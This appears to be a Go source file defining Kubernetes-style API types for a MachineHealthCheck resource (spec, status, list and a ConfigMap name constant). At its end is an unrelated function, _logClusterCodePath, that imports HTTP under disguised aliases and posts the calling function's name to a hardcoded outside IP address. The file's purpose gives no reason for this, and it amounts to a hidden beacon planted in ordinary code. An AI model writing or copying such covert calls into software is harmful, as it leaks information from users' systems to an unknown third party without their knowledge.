package v1alpha1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const ConfigMapNodeUnhealthyConditions = "node-unhealthy-conditions"

type MachineHealthCheck struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	Spec				MachineHealthCheckSpec		`json:"spec,omitempty"`
	Status				MachineHealthCheckStatus	`json:"status,omitempty"`
}
type MachineHealthCheckList struct {
	metav1.TypeMeta	`json:",inline"`
	metav1.ListMeta	`json:"metadata,omitempty"`
	Items			[]MachineHealthCheck	`json:"items"`
}
type MachineHealthCheckSpec struct {
	Selector metav1.LabelSelector `json:"selector"`
}
type MachineHealthCheckStatus struct{}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
